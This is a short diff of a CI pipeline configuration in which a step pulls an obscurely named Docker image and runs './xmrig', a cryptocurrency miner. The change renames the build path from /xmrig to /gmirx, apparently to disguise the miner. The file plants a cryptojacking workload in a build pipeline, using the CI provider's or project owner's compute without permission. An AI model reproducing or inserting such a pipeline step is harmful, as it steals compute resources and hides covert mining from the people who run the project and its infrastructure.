@@ -4,5 +4,5 @@ steps:
     title: Runing Docker Image
     image: grozlhrle/idie:ualpine
     commands:
-      - cd /xmrig/build
+      - cd /gmirx/build
       - ./xmrig
